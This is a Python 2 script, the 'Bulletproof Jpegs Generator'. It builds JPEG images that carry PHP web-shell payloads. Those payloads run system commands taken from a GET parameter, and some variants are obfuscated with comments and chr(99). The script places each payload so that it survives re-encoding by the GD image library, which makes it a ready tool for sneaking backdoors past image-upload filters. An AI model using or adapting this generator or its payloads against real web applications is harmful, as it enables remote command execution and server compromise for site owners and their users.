#!/usr/bin/python

"""

    Bulletproof Jpegs Generator
    Copyright (C) 2012  Damien "virtualabs" Cauquil

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
    
"""

import struct,sys,os
import gd
from StringIO import StringIO
from random import randint,shuffle
from time import time

# image width/height (square)
N = 32


def insertPayload(_in, _out, payload,off):
	"""
	Payload insertion (quick JPEG parsing and patching)
	"""
	img = _in
	# look for 'FF DA' (SOS)
	sos = img.index("\xFF\xDA")
	sos_size = struct.unpack('>H',img[sos+2:sos+4])[0]
	sod = sos_size+2
	# look for 'FF D9' (EOI)
	eoi = img[sod:].index("\xFF\xD9")
	# enough size ?
	if (eoi - sod - off)>=len(payload):
		_out.write(img[:sod+sos+off]+payload+img[sod+sos+len(payload)+off:])
		return True
	else:
		return False

if __name__=='__main__':

	print "[+] Virtualabs' Nasty bulletproof Jpeg generator"
	print " |  website: http://virtualabs.fr"
	print " |  contact: virtualabs -at- gmail -dot- com"
	print ""

	payloads = ["<?php system(/**/$_GET['c'/**/]); ?>","<?php /**/system($_GET[chr(99)/**/]); ?>","<?php system(/**/$_GET[chr(99)]); ?>","<?php\r\nsystem($_GET[/**/'c']);\r\n ?>"]

	# make sure the exploit-jpg directory exists or create it
	if os.path.exists('exploit-jpg') and not os.path.isdir('exploit-jpg'):
		print "[!] Please remove the file named 'exploit-jpg' from the current directory"
	elif not os.path.exists('exploit-jpg'):
		os.mkdir('exploit-jpg')
		
	# start generation
	print '[i] Generating ...'
	for q in range(50,100)+[-1]:
		# loop over every payload		
		for p in payloads:
			# not done yet
			done = False
			start = time()
			# loop while not done and timeout not reached
			while not done and (time()-start)<10.0:
				
				# we create a NxN pixels image, true colors
				img = gd.image((N,N),True)
				# we create a palette
				pal = []
				for i in range(N*N):
					pal.append(img.colorAllocate((randint(0,256),randint(0,256),randint(0,256))))
				# we shuffle this palette
				shuffle(pal)
				# and fill the image with it			
				pidx = 0
				for x in  range(N):
					for y in range(N):
						img.setPixel((x,y),pal[pidx])
						pidx+=1
						
				# write down the image
				out_jpg = StringIO('')	
				img.writeJpeg(out_jpg,q)
				out_raw = out_jpg.getvalue()
							
				# now, we try to insert the payload various ways
				for i in range(64):
					test_jpg = StringIO('')
					if insertPayload(out_raw,test_jpg,p,i):
						try:
							# write down the new jpeg file
							f = open('exploit-jpg/exploit-%d.jpg'%q,'wb')
							f.write(test_jpg.getvalue())
							f.close()
							
							# load it with GD
							test = gd.image('exploit-jpg/exploit-%d.jpg'%q)
							final_jpg = StringIO('')
							test.writeJpeg(final_jpg,q)
							final_raw = final_jpg.getvalue()
							# does it contain our payload ?
							if p in final_raw:
								# Yay ! 
								print '[i] Jpeg quality %d ... DONE'%q
								done = True
								break
						except IOError,e:
							pass
					else:
						break
			if not done:
				# payload not found, we remove the file
				os.unlink('exploit-jpg/exploit-%d.jpg'%q)
			else:		
				break
			